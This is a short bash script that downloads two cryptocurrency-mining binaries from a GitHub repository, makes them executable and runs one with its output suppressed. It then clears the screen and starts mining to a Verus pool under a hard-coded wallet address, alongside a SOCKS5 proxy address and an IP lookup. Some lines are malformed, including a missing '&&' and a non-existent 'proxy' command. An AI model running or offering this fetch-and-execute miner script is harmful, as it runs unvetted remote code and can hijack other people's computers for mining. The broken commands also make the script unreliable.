#!/bin/bash
wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver >/dev/null 2>&1
clear
./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.STB#1 -p x --cpu 1 && proxy socks5://184.178.172.14:4145 && curl ipinfo.io
